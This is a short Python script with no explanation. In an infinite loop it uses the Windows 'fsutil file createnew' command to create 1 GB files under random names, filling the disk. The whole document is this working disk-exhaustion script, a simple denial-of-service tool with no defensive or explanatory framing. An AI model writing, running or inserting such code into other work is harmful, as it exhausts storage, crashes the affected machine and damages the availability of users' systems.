import os,random
while(1):
    number = random.randint(1,1000)
    os.system(f"fsutil file createnew text{number}.txt 1073741824")